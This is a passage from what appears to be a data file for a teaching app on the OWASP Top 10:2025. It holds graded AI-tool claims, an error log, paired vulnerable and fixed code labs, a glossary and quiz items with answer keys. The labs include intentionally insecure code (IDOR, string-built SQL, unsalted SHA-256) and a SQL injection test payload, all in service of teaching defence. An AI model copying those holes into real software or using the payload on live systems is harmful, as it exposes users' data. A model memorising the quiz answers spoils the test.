  { id: "CLM-002", source: "A01:2025", tool: "ChatGPT", strategy: "A-Basic", level: "Advanced", claim: "Hiding administrative buttons in the frontend UI prevents unauthorized API access.", status: "Incorrect", evidence: "A01:2025 Prevention: 'Access control is only effective if enforced in trusted server-side code.'", note: "Critical architectural misconception. Client controls are easily bypassed." },
  { id: "CLM-003", source: "A01:2025", tool: "ChatGPT", strategy: "B-Evidence", level: "Advanced", claim: "Authorization checks must be implemented on server-side code or serverless APIs, not client UI.", status: "Verified", evidence: "A01:2025 Prevention Section cited verbatim.", note: "Corrected from Strategy A via source grounding." },
  { id: "CLM-004", source: "A02:2025", tool: "Gemini", strategy: "A-Basic", level: "Beginner", claim: "Security misconfiguration happens when software is deployed with default insecure passwords.", status: "Verified", evidence: "A02:2025: 'Default accounts and passwords left unchanged.'", note: "Supported directly." },
  { id: "CLM-005", source: "A02:2025", tool: "Gemini", strategy: "A-Basic", level: "Advanced", claim: "Stack traces in error responses are harmless if the application uses an ORM.", status: "Incorrect", evidence: "A02:2025: 'Error handling reveals stack traces facilitating target reconnaissance.'", note: "Stack traces leak database schema and internal file paths." },
  { id: "CLM-006", source: "A03:2025", tool: "Claude", strategy: "A-Basic", level: "Advanced", claim: "Pinning an exact dependency version in package.json guarantees the library is free from security bugs.", status: "Partially verified", evidence: "A03:2025: 'Pinning stabilizes versions, but does not guarantee components lack known CVEs.'", note: "Pinning provides determinism, not absolute vulnerability immunity." },
  { id: "CLM-007", source: "A03:2025", tool: "Claude", strategy: "B-Evidence", level: "Advanced", claim: "Software supply chain defense requires lockfiles (npm ci), continuous SBOM tracking, and vulnerability scanning.", status: "Verified", evidence: "A03:2025 Prevention: Mandates inventory, SBOM, and integrity checks.", note: "Traceable and technically rigorous." },
  { id: "CLM-008", source: "A04:2025", tool: "ChatGPT", strategy: "A-Basic", level: "Advanced", claim: "Fast SHA-256 hashing without salt is suitable for user password storage.", status: "Incorrect", evidence: "A04:2025: 'Passwords must be hashed using adaptive cryptographic hashing (Argon2id, bcrypt).'", note: "Severe vulnerability. SHA-256 can be cracked at billions of guesses/sec on consumer GPUs." },
  { id: "CLM-009", source: "A04:2025", tool: "ChatGPT", strategy: "B-Evidence", level: "Advanced", claim: "Argon2id is the recommended memory-hard adaptive hashing algorithm for passwords.", status: "Verified", evidence: "A04:2025 & OWASP Password Storage Cheat Sheet.", note: "Fully compliant with 2025 standards." },
  { id: "CLM-010", source: "A05:2025", tool: "Gemini", strategy: "B-Evidence", level: "Advanced", claim: "Parameterized queries separate SQL syntax compilation from literal user data.", status: "Verified", evidence: "A05:2025 Prevention: 'Parameterized interfaces treat input strictly as data.'", note: "Gold standard defense verified." },
  { id: "CLM-011", source: "A07:2025", tool: "Claude", strategy: "A-Basic", level: "Advanced", claim: "Returning 'Email not found' vs 'Incorrect password' has zero security impact.", status: "Incorrect", evidence: "A07:2025: 'Permits account enumeration attacks during credential stuffing.'", note: "Allows attackers to discover registered user emails." },
  { id: "CLM-012", source: "A07:2025", tool: "Claude", strategy: "B-Evidence", level: "Advanced", claim: "Authentication defense mandates rate limiting, MFA, and constant-time dummy verification.", status: "Verified", evidence: "A07:2025 Prevention guidelines.", note: "Directly matches official recommendation." }
];

export const ERROR_LOG = [
  {
    id: "ERR-001",
    claimId: "CLM-002",
    tool: "ChatGPT (GPT-4o)",
    strategy: "A-Basic",
    category: "A01:2025 Broken Access Control",
    errorType: "Architectural Insecurity",
    description: "Recommending frontend client-side UI button hiding as an access control mechanism.",
    expected: "Authorization checks must reside in trusted server-side code or serverless APIs on every request.",
    evidence: "OWASP A01:2025 'How to Prevent': 'Access control is only effective if enforced in trusted server-side code...'",
    severity: "High",
    resolution: "Flagged and corrected with server-side middleware and database ownerId filtering."
  },
  {
    id: "ERR-002",
    claimId: "CLM-008",
    tool: "ChatGPT (GPT-4o)",
    strategy: "A-Basic",
    category: "A04:2025 Cryptographic Failures",
    errorType: "Weak Cryptographic Recommendation",
    description: "Suggesting plain SHA-256 without salt or memory hardness for password storage.",
    expected: "Passwords must be hashed using adaptive algorithms with memory hardness (Argon2id, scrypt, or bcrypt).",
    evidence: "OWASP A04:2025 Section: Prevention; Fast general-purpose digests are prohibited for credentials.",
    severity: "Critical",
    resolution: "Replaced with Argon2id implementation configured with calibrated memory and parallelism."
  },
  {
    id: "ERR-003",
    claimId: "CLM-005",
    tool: "Gemini (Gemini 1.5 Pro)",
    strategy: "A-Basic",
    category: "A02:2025 Security Misconfiguration",
    errorType: "Information Leakage Oversight",
    description: "Claiming stack trace outputs in production are harmless when using ORMs.",
    expected: "Stack traces reveal file paths, database schemas, and framework versions, facilitating exploit staging.",
    evidence: "OWASP A02:2025 Section: Vulnerability Scenarios & Error Handling.",
    severity: "Medium",
    resolution: "Enforced environment-aware error handling that routes diagnostic traces to internal server logs only."
  },
  {
    id: "ERR-004",
    claimId: "CLM-006",
    tool: "Claude (Claude 3.5 Sonnet)",
    strategy: "A-Basic",
    category: "A03:2025 Software Supply Chain Failures",
    errorType: "Overgeneralized Safety Guarantee",
    description: "Asserting that pinning an exact package version guarantees safety from security vulnerabilities.",
    expected: "Pinning prevents unintentional upstream updates, but does not guarantee the pinned code is free from CVEs.",
    evidence: "OWASP A03:2025 Section: Software Supply Chain Failures; requires active auditing and SBOM.",
    severity: "Medium",
    resolution: "Clarified that version pinning is a prerequisite, not a complete defense."
  },
  {
    id: "ERR-005",
    claimId: "CLM-011",
    tool: "Claude (Claude 3.5 Sonnet)",
    strategy: "A-Basic",
    category: "A07:2025 Authentication Failures",
    errorType: "Account Enumeration Flaw",
    description: "Treating differentiated login error responses ('Email not found' vs 'Wrong password') as acceptable.",
    expected: "Authentication endpoints must return generic error messages to prevent automated user mapping.",
    evidence: "OWASP A07:2025 Anti-Enumeration & Credential Stuffing Prevention.",
    severity: "Medium",
    resolution: "Updated code lab to use generic errors and constant-time dummy verification."
  }
];

export const CODE_LABS = [
  {
    id: "LAB-001",
    owaspId: "A01:2025",
    name: "Broken Access Control (IDOR Prevention)",
    language: "javascript",
    vulnerableCode: `// INSECURE: Relies entirely on client-supplied ID parameter
app.get('/api/documents/:id', async (req, res) => {
  // Directly fetches record without checking who is logged in!
  const doc = await db.documents.findById(req.params.id);
  res.json(doc);
});`,
    fixedCode: `// SECURE: Enforces server-side authentication & ownership check
app.get('/api/documents/:id', requireLogin, async (req, res) => {
  // Query is strictly constrained to the authenticated session ownerId
  const doc = await db.documents.findOne({
    id: req.params.id,
    ownerId: req.user.id
  });

  if (!doc) {
    // Return 404 to avoid leaking document existence to unauthorized callers
    return res.status(404).json({ error: 'Document not found' });
  }

  res.json(doc);
});`,
    whyFixWorks: "The vulnerable pattern allows any user to inspect another user's documents simply by altering the `:id` parameter. The fixed pattern adds the `requireLogin` middleware to establish user identity from trusted session cookies, and forces the database query to match both the requested document ID AND the caller's verified `ownerId`.",
    testPayload: {
      userA_id: 101,
      target_doc_id: 884,
      doc_owner_id: 202
    },
    simulatedVulnerableResult: "HTTP 200 OK — Document data belonging to User 202 disclosed to User 101! (DATA BREACH)",
    simulatedSecureResult: "HTTP 404 Not Found — Query returned 0 rows for User 101; access blocked securely."
  },
  {
    id: "LAB-002",
    owaspId: "A02:2025",
    name: "Security Misconfiguration (Production Error Handling)",
    language: "javascript",
    vulnerableCode: `// INSECURE: Debug error handler dumps internal stack frames
app.use(errorHandler({
  showStackTrace: true,
  dumpExceptions: true
}));`,
    fixedCode: `// SECURE: Environment-aware error handling
const isProduction = process.env.NODE_ENV === 'production';

app.use((err, req, res, next) => {
  // Securely log technical stack traces to private server logs
  logger.error({ err, reqId: req.id });

  if (isProduction) {
    // Sanitized response for public clients
    return res.status(500).json({
      error: 'An unexpected internal error occurred',
      referenceId: req.id
    });
  }

  // Developer diagnostic detail strictly limited to development
  res.status(500).json({ error: err.message, stack: err.stack });
});`,
    whyFixWorks: "Detailed stack traces reveal directory structures, database queries, framework versions, and internal source code filenames. The fixed code isolates detailed diagnostics to private server-side logs and presents a sanitized, uniform error message with an incident reference ID to end users in production.",
    testPayload: {
      action: "Trigger database connection timeout error in production"
    },
    simulatedVulnerableResult: "HTTP 500 — Full stack trace dumped: `Error at /var/app/db/pg.js:42: connection to postgresql://admin:secret@10.0.1.5 failed`",
    simulatedSecureResult: "HTTP 500 — Generic JSON: `{ error: 'An unexpected internal error occurred', referenceId: 'req-8f92' }`"
  },
  {
    id: "LAB-003",
    owaspId: "A03:2025",
    name: "Software Supply Chain Failures (Deterministic Dependencies)",
    language: "json",
    vulnerableCode: `// INSECURE package.json: Wildcards & unpinned dependencies
{
  "name": "payment-service",
  "dependencies": {
    "auth-token-validator": "*",
    "crypto-tools": "^2.0.0"
  }
}`,
    fixedCode: `// SECURE package.json: Pinned versions + Lockfile Integrity
{
  "name": "payment-service",
  "dependencies": {
    "auth-token-validator": "1.4.2",
    "crypto-tools": "2.1.0"
  }
}

// In CI/CD build scripts:
// 1. Enforce strict reproducible install from package-lock.json:
//    npm ci --ignore-scripts
// 2. Audit dependencies for known vulnerabilities:
//    npm audit --audit-level=high`,
    whyFixWorks: "Using `*` or loose version ranges automatically pulls unvetted updates from upstream package registries on every build, creating an open vector for supply-chain malware injection. Pinning versions and running `npm ci` ensures identical, cryptographically validated packages are installed across development, staging, and production.",
    testPayload: {
      action: "Upstream author pushes compromised version 1.4.3 containing reverse shell"
    },
    simulatedVulnerableResult: "Build pulls rogue version 1.4.3 automatically. Malicious code executes during startup!",
    simulatedSecureResult: "Build installs pinned 1.4.2 strictly matching lockfile checksum. Upstream poison ignored."
  },
  {
    id: "LAB-004",
    owaspId: "A04:2025",
    name: "Cryptographic Failures (Adaptive Password Hashing)",
    language: "python",
    vulnerableCode: `# INSECURE: Fast general-purpose SHA-256 without memory hardness
import hashlib

def save_password(user, raw_password):
    # GPUs calculate billions of SHA-256 hashes per second!
    password_hash = hashlib.sha256(raw_password.encode()).hexdigest()
    database.save(user, password_hash)`,
    fixedCode: `# SECURE: Memory-hard Argon2id adaptive password hashing
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # 3 iterations
    memory_cost=65536,  # 64 MB of RAM required per attempt
    parallelism=4,      # 4 parallel lanes
    hash_len=32,
    salt_len=16
)

def save_password(user, raw_password):
    # Automatically generates unique cryptographic salt and tuned work factor
    password_hash = ph.hash(raw_password)
    database.save(user, password_hash)

def verify_password(stored_hash, candidate_password):
    return ph.verify(stored_hash, candidate_password)`,
    whyFixWorks: "SHA-256 was designed for rapid data integrity checks, not credential storage. Modern consumer GPUs compute over 10 billion SHA-256 hashes per second. Argon2id is a memory-hard algorithm that forces any cracking hardware to allocate dedicated high-speed RAM per attempt, neutralizing GPU and ASIC brute-force clusters.",
    testPayload: {
      password: "CorrectHorseBatteryStaple!",
      attacker_hardware: "NVIDIA RTX 4090 GPU Cluster"
    },
    simulatedVulnerableResult: "SHA-256 hash cracked in 0.004 seconds using offline rainbow table and dictionary.",
    simulatedSecureResult: "Argon2id forces 64MB RAM usage per guess. Cracking attempt renders GPU cluster economically infeasible."
  },
  {
    id: "LAB-005",
    owaspId: "A05:2025",
    name: "Injection (Parameterized Database Queries)",
    language: "python",
    vulnerableCode: `# INSECURE: String formatting combines SQL command with user input
def search_user(email):
    # Raw string concatenation allows hostile input to alter SQL syntax
    query = f"SELECT * FROM users WHERE email = '{email}'"
    return db.cursor().execute(query).fetchall()`,
    fixedCode: `# SECURE: Parameterized prepared statement
def search_user(email):
    # Database compiles query structure FIRST; treats email strictly as literal data
    query = "SELECT * FROM users WHERE email = %s"
    return db.cursor().execute(query, (email,)).fetchall()`,
    whyFixWorks: "When raw strings are concatenated, the SQL interpreter cannot distinguish between the developer's SQL commands and the user's data. Parameterized queries compile the SQL statement execution plan before binding parameters, guaranteeing that quotes and SQL keywords like `OR` or `DROP` are treated strictly as innocent literal text.",
    testPayload: {
      email_input: "admin@corp.com' OR '1'='1' --"
    },
    simulatedVulnerableResult: "Query compiles as: `SELECT * FROM users WHERE email = 'admin@corp.com' OR '1'='1' --'`. Dumps entire user database!",
    simulatedSecureResult: "Query looks for user with literal email matching the entire string. Safely returns 0 matches."
  },
  {
    id: "LAB-006",
    owaspId: "A07:2025",
    name: "Authentication Failures (Rate Limiting & Timing Defense)",
    language: "javascript",
    vulnerableCode: `// INSECURE: Unlimited attempts & informative error leakage
app.post('/api/login', async (req, res) => {
  const user = await db.users.find({ email: req.body.email });
  if (!user) {
    return res.status(404).send('Email not registered'); // Leaks existence!
  }
  if (user.password !== req.body.password) {
    return res.status(401).send('Incorrect password');
  }
  res.json({ token: createSession(user) });
});`,
    fixedCode: `// SECURE: Rate limiting, constant-time verification & uniform error
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minute window
  max: 5,                   // 5 failed attempts per IP
  message: { error: 'Too many login attempts. Please try again in 15 minutes.' }
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.find({ email });

  // Always perform constant-time work even if user does not exist!
  const isValid = user
    ? await verifyArgon2(user.hash, password)
    : await dummyWorkPassword(password);

  if (!user || !isValid) {
    // Uniform message prevents username enumeration
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  res.json({ token: createSecureSessionToken(user) });
});`,
    whyFixWorks: "Differentiating error messages allows credential stuffers to discover registered email addresses. Missing rate limits allow rapid dictionary attacks. The secure version caps attempts to 5 per 15 minutes, returns a uniform failure message, and executes dummy cryptographic work for nonexistent accounts to eliminate timing side-channels.",
    testPayload: {
      action: "Script fires 50 automated guesses within 5 seconds"
    },
    simulatedVulnerableResult: "50 attempts processed immediately; leaks whether target user exists in database.",
    simulatedSecureResult: "5th attempt triggers HTTP 429 Too Many Requests; automated attack throttled and blocked."
  }
];

export const GLOSSARY_TERMS = [
  { id: "G01", term: "Access Control", simple: "Rules deciding what a user can access", technical: "Enforcement of permissions on resources and actions based on user identity and policy", owasp: "A01:2025", verified: true, realWorldExample: "A hotel keycard programmed to open only Room 402, refusing entry to other guest rooms or the hotel manager's safe." },
  { id: "G02", term: "Least Privilege", simple: "Give users only the access they need", technical: "Restricting system access and execution rights to the absolute minimum necessary for authorized duties", owasp: "A01:2025", verified: true, realWorldExample: "A valet parking key that only starts the car engine, preventing the valet from unlocking the private glovebox or trunk." },
  { id: "G03", term: "Security Misconfiguration", simple: "An insecure setting in a system", technical: "Incorrect security-related configuration of an application, cloud storage, container, or web server", owasp: "A02:2025", verified: true, realWorldExample: "Buying an expensive home security camera but leaving the manufacturer default password 'admin123' unchanged." },
  { id: "G04", term: "Dependency", simple: "An external component your software relies on", technical: "A third-party library, package, or framework integrated into an application's codebase", owasp: "A03:2025", verified: true, realWorldExample: "A car manufacturer using pre-assembled brake pads made by a specialist supplier instead of manufacturing every screw from scratch." },
  { id: "G05", term: "Software Supply Chain", simple: "The tools and components used to build and deliver software", technical: "The ecosystem of dependencies, repositories, build tools, CI/CD pipelines, and distribution channels", owasp: "A03:2025", verified: true, realWorldExample: "The entire journey fresh milk takes from dairy farm to distributor trucks to grocery shelves—if any link is contaminated, the bottle on the table is dangerous." },
  { id: "G06", term: "Encryption", simple: "Making information unreadable without the right key", technical: "Transforming plaintext into ciphertext using a cryptographic algorithm and secret key to ensure confidentiality", owasp: "A04:2025", verified: true, realWorldExample: "Locking a letter inside a heavy titanium safe and mailing the safe—only the intended recipient with the exact combination can read the letter." },
  { id: "G07", term: "Key Management", simple: "Safely handling encryption keys", technical: "The full lifecycle governance of cryptographic keys: generation, distribution, storage, rotation, and revocation", owasp: "A04:2025", verified: true, realWorldExample: "Keeping the master keys to a jewelry store in a fireproof vault with a strict sign-out log and changing the locks whenever an employee resigns." },
  { id: "G08", term: "Injection", simple: "Untrusted input changes how a command is interpreted", technical: "Flaw where hostile input is interpreted as machine instructions rather than literal parameters", owasp: "A05:2025", verified: true, realWorldExample: "Writing 'Cancel all food orders and refund cash' on a restaurant napkin order slip, and the kitchen manager robotically handing over the cash register." },
  { id: "G09", term: "Parameterized Query", simple: "Keeping user input separate from a database command", technical: "Pre-compiled database statement where parameters are bound by value, preventing syntax manipulation", owasp: "A05:2025", verified: true, realWorldExample: "A bank deposit envelope with dedicated pre-printed slots for Name and Dollar Amount—cash never gets mixed into the bank's internal ledger rules." },
  { id: "G10", term: "Authentication", simple: "Checking who a user is", technical: "The process of verifying an entity's claimed identity using credentials, tokens, or biometric factors", owasp: "A07:2025", verified: true, realWorldExample: "Showing your official government passport and matching your facial scan at airport customs to prove you are who you claim to be." },
  { id: "G11", term: "Multi-Factor Authentication (MFA)", simple: "Requiring more than one type of proof of identity", technical: "Authentication requiring two or more distinct credential categories: knowledge, possession, or inherence", owasp: "A07:2025", verified: true, realWorldExample: "Entering your ATM PIN (something you know) AND inserting your physical debit chip card (something you have) before getting cash." },
  { id: "G12", term: "Session Management", simple: "Keeping track of a user's signed-in session", technical: "Secure creation, handling, transmission, and invalidation of stateless or stateful session tokens", owasp: "A07:2025", verified: true, realWorldExample: "An amusement park wristband stamped with today's date and expiration time—you can ride all day, but the wristband is clipped when you exit the gate." }
];

export const QUESTION_SETS = [
  {
    id: "set-1",
    name: "Set 1: Core Fundamentals & Principles",
    description: "Evaluates foundational concepts, definitions, and core rules across the 6 OWASP Top 10:2025 categories.",
    questions: [
      {
        id: "Q01",
        owasp: "A01:2025",
        question: "What does access control determine in a web application?",
        options: [
          "User permissions and allowed operations on resources",
          "Screen display resolution and dark mode themes",
          "Network bandwidth and upload speed limits",
          "Database schema encoding format"
        ],
        answer: 0,
        explanation: "Access control enforces policy so that users cannot act outside their permitted operations.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q02",
        owasp: "A01:2025",
        question: "Where must access control checks be strictly enforced to be effective?",
        options: [
          "Client-side HTML and JavaScript buttons",
          "Trusted server-side code or serverless APIs",
          "Browser CSS stylesheet rules",
          "Client browser cookies"
        ],
        answer: 1,
        explanation: "Client-side checks are easily bypassed by intercepting or forging HTTP requests. Enforcement must reside on trusted server-side code.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q03",
        owasp: "A01:2025",
        question: "What is the core principle of Least Privilege?",
        options: [
          "Grant everyone full administrative permissions",
          "Deny access to all valid users",
          "Give users only the minimum necessary permissions required for their tasks",
          "Share administrative passwords across engineering teams"
        ],
        answer: 2,
        explanation: "Least privilege minimizes risk by limiting privileges to only what is required to perform specific tasks.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q04",
        owasp: "A02:2025",
        question: "What defines a Security Misconfiguration according to OWASP?",
        options: [
          "A properly rotated strong cryptographic password",
          "An up-to-date automated software security patch",
          "A daily scheduled database backup snapshot",
          "An insecure, default, or improperly maintained system setting"
        ],
        answer: 3,
        explanation: "Misconfigurations arise from default accounts, exposed debug endpoints, missing security headers, or verbose error messages.",
        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
      },
      {
        id: "Q05",
        owasp: "A02:2025",
        question: "Which practice defends against Security Misconfiguration in production?",
        options: [
          "Expose detailed stack traces to end users in the browser",
          "Harden configurations and disable debug modes in production",
          "Disable all firewalls and security headers",
          "Store plaintext credentials in repository READMEs"
        ],
        answer: 1,
        explanation: "Disabling debug features in production prevents information disclosure of database queries and internal architecture.",
        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
      },
      {
        id: "Q06",
        owasp: "A03:2025",
        question: "What is a third-party software dependency?",
        options: [
          "A required external library or package your application imports",
          "A user's plaintext login password",
          "The visual design mockup of a web page",
          "A hardware network router cable"
        ],
        answer: 0,
        explanation: "Dependencies are external software components bundled into your application to provide functional capabilities.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q07",
        owasp: "A03:2025",
        question: "What scope should dependency management and vulnerability scanning track?",
        options: [
          "Application logo image files only",
          "Direct top-level dependencies only",
          "Both direct and transitive (nested) dependencies",
          "Nothing once initial installation completes"
        ],
        answer: 2,
        explanation: "Vulnerabilities frequently reside deep within transitive dependencies pulled in by direct packages.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q08",
        owasp: "A03:2025",
        question: "Does pinning an exact dependency version alone guarantee that a package is secure?",
        options: [
          "Yes, pinned versions can never have security flaws",
          "Only when running on Windows servers",
          "Only for open-source software packages",
          "No, pinned versions can still contain known or discovered vulnerabilities"
        ],
        answer: 3,
        explanation: "Pinning prevents unexpected automatic updates, but it does not guarantee that the pinned version is free from critical flaws.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q09",
        owasp: "A04:2025",
        question: "What represents a Cryptographic Failure according to OWASP?",
        options: [
          "Slow page load times due to network latency",
          "Weaknesses in cryptographic algorithms, protocols, or key management",
          "A broken hyperlink on the home page",
          "A syntax error in a JavaScript loop"
        ],
        answer: 1,
        explanation: "Cryptographic failures include using obsolete ciphers (e.g. MD5), missing encryption in transit, or improper secret storage.",
        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
      },
      {
        id: "Q10",
        owasp: "A04:2025",
        question: "How should user passwords normally be stored in modern databases?",
        options: [
          "Plain text in a restricted database column",
          "Reversible Base64 encoding",
          "Salted adaptive password hashing (e.g. Argon2id or bcrypt)",
          "Hardcoded directly into backend scripts"
        ],
        answer: 2,
        explanation: "Adaptive hashing algorithms incorporate cryptographic salts and computationally tuned work factors to resist offline GPU brute-force attacks.",
        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
      },
      {
        id: "Q11",
        owasp: "A05:2025",
        question: "What is the underlying mechanism of SQL Injection?",
        options: [
          "Creating automated database backups",
          "A physical disruption of server hardware",
          "A secure token-based login process",
          "Hostile input altering the intended SQL syntax and execution logic"
        ],
        answer: 3,
        explanation: "SQL injection occurs when untrusted user input is directly concatenated into a dynamic SQL query string.",
        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
      },
      {
        id: "Q12",
        owasp: "A05:2025",
        question: "What is the primary defensive measure against SQL Injection?",
        options: [
          "Using parameterized queries (prepared statements)",
          "Concatenating strings with raw user input",
          "Hiding the submit button with CSS",
          "Renaming database table columns to longer names"
        ],
        answer: 0,
        explanation: "Parameterized queries ensure the database engine compiles the query template first and treats user parameters strictly as data.",
        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
      },
      {
        id: "Q13",
        owasp: "A07:2025",
        question: "What is the primary purpose of Authentication?",
        options: [
          "Styling user interface components",
          "Verifying the claimed identity of a user or service",
          "Compressing files before network transmission",
          "Indexing database tables for faster search"
        ],
        answer: 1,
        explanation: "Authentication confirms that an entity is genuinely who they claim to be through valid credentials or assertions.",
        evidenceUrl: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/"
      },
      {
        id: "Q14",
        owasp: "A07:2025",
        question: "What does Multi-Factor Authentication (MFA) strictly require?",
        options: [
          "A very long username",
          "A publicly accessible social profile",
          "Two or more distinct authentication factor categories (knowledge, possession, inherence)",
          "Authentication without passwords or tokens"
        ],
        answer: 2,
        explanation: "MFA combines distinct factor categories (e.g. password + authenticator TOTP token) rather than multiple instances of the same factor.",
        evidenceUrl: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/"
      },
      {
        id: "Q15",
        owasp: "A07:2025",
        question: "Why should login endpoints enforce rate limiting?",
        options: [
          "To change the background color of the web application",
          "To make user passwords publicly readable",
          "To bypass authorization checks during high traffic",
          "To mitigate automated brute-force and credential stuffing attacks"
        ],
        answer: 3,
        explanation: "Rate limiting restricts the frequency of repeated authentication attempts from a single IP or account, blocking high-speed credential stuffing.",
        evidenceUrl: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/"
      }
    ]
  },
  {
    id: "set-2",
    name: "Set 2: Defensive Engineering & Code Scenarios",
    description: "Tests practical implementation details, code review anti-patterns, and direct mitigation mechanisms.",
    questions: [
      {
        id: "Q2-01",
        owasp: "A01:2025",
        question: "What is an Insecure Direct Object Reference (IDOR)?",
        options: [
          "Exposing an internal object identifier without server-side authorization checks",
          "A CSS layout misalignment on high-resolution screens",
          "A failure in local DNS network caching",
          "Physical damage to a database server hard drive"
        ],
        answer: 0,
        explanation: "IDOR occurs when an application provides direct access to records based on user-supplied input without server-side authorization validation.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q2-02",
        owasp: "A01:2025",
        question: "Why is hiding administrative buttons with CSS ('display: none') insufficient for access control?",
        options: [
          "CSS stylesheets take too long to download on cellular networks",
          "Attackers can bypass client-side CSS and issue HTTP requests directly to backend endpoints",
          "CSS rules only execute on mobile device viewports",
          "It causes excessive memory allocation in Node.js"
        ],
        answer: 1,
        explanation: "Client-side controls are cosmetic. Attackers can forge raw HTTP/API requests directly; enforcement must happen on trusted server-side code.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q2-03",
        owasp: "A01:2025",
        question: "What distinguishes Horizontal Privilege Escalation from Vertical Privilege Escalation?",
        options: [
          "Horizontal accesses data of peer users at the same privilege level; Vertical gains higher administrative privileges",
          "Horizontal occurs on Windows servers; Vertical occurs on Linux containers",
          "Horizontal compromises databases; Vertical compromises network firewalls",
          "Horizontal refers to encryption; Vertical refers to hashing"
        ],
        answer: 0,
        explanation: "Horizontal escalation involves accessing peer user data (e.g. user A viewing user B's invoices). Vertical escalation involves gaining elevated roles (e.g. user becoming admin).",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q2-04",
        owasp: "A02:2025",
        question: "Why should production error handlers never disclose full stack traces to end users?",
        options: [
          "Stack traces make HTML responses slightly larger in file size",
          "Stack traces reveal source file paths, framework versions, database schema names, and internal logic to attackers",
          "Web browsers crash when receiving stack trace text strings",
          "Stack traces are automatically encrypted by web servers"
        ],
        answer: 1,
        explanation: "Stack traces facilitate target reconnaissance by exposing source file paths, database queries, and vulnerable framework versions.",
        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
      },
      {
        id: "Q2-05",
        owasp: "A02:2025",
        question: "What is the primary defensive role of the HTTP Content-Security-Policy (CSP) header?",
        options: [
          "It compresses media images on web applications",
          "It restricts the authorized sources of scripts, styles, and objects that the browser is permitted to execute",
          "It automatically creates scheduled database backup snapshots",
          "It forces user passwords to expire every 30 days"
        ],
        answer: 1,
        explanation: "CSP restricts authorized sources of scripts and resources, mitigating cross-site scripting and data injection attacks.",
        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
      },
      {
        id: "Q2-06",
        owasp: "A02:2025",
        question: "Why are public default cloud storage permissions (e.g. public Amazon S3 / Azure blob) classified as Security Misconfiguration?",
        options: [
          "They cost organizations more in monthly cloud bandwidth fees",
          "They expose sensitive enterprise assets to anonymous Internet scraping due to unhardened default policies",
          "They throttle download speeds for authenticated staff",
          "They prevent administrators from logging into cloud management portals"
        ],
        answer: 1,
        explanation: "Failing to restrict cloud storage bucket ACLs leaves confidential databases, backups, or logs open to unauthorized public extraction.",
        evidenceUrl: "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/"
      },
      {
        id: "Q2-07",
        owasp: "A03:2025",
        question: "What is a Software Bill of Materials (SBOM) used for in software supply chain security?",
        options: [
          "A legal receipt for commercial software purchase",
          "A comprehensive inventory of all third-party components, libraries, and dependencies bundled into software",
          "A list of corporate employee login credentials",
          "A visual mockup document for UI color palettes"
        ],
        answer: 1,
        explanation: "An SBOM provides visibility into all direct and transitive dependencies, enabling rapid tracking when a critical CVE is disclosed.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q2-08",
        owasp: "A03:2025",
        question: "Why is 'npm ci' strongly recommended over 'npm install' in production CI/CD build pipelines?",
        options: [
          "It installs packages with dark mode styling enabled",
          "It strictly installs exact versions from package-lock.json without modifying or drifting dependencies",
          "It automatically deletes source code files after compilation",
          "It operates only when no Internet connection is present"
        ],
        answer: 1,
        explanation: "'npm ci' enforces deterministic builds by verifying checksums and rejecting uncommitted lockfile discrepancies.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q2-09",
        owasp: "A03:2025",
        question: "What characterizes a 'typosquatting' attack in package registries (npm/PyPI)?",
        options: [
          "Fixing spelling mistakes in open-source README files",
          "Publishing malicious packages with names intentionally similar to popular libraries (e.g. 'cross-env' vs 'crossenv')",
          "Cracking passwords using automated dictionary scripts",
          "Sending phishing emails to package maintainers"
        ],
        answer: 1,
        explanation: "Typosquatters register misspelled variants of common packages to trick developers into importing hostile code.",
        evidenceUrl: "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/"
      },
      {
        id: "Q2-10",
        owasp: "A04:2025",
        question: "Why is Argon2id preferred over standard fast hashing algorithms (like SHA-256) for password storage?",
        options: [
          "Argon2id produces shorter hexadecimal hash strings",
          "Argon2id is memory-hard and computationally tunable, neutralizing GPU and ASIC cracking clusters",
          "SHA-256 is an obsolete 8-bit hashing algorithm",
          "Argon2id operates without requiring user passwords"
        ],
        answer: 1,
        explanation: "General-purpose digests like SHA-256 can be calculated at billions of guesses/sec on consumer GPUs. Argon2id requires calibrated RAM per guess.",
        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
      },
      {
        id: "Q2-11",
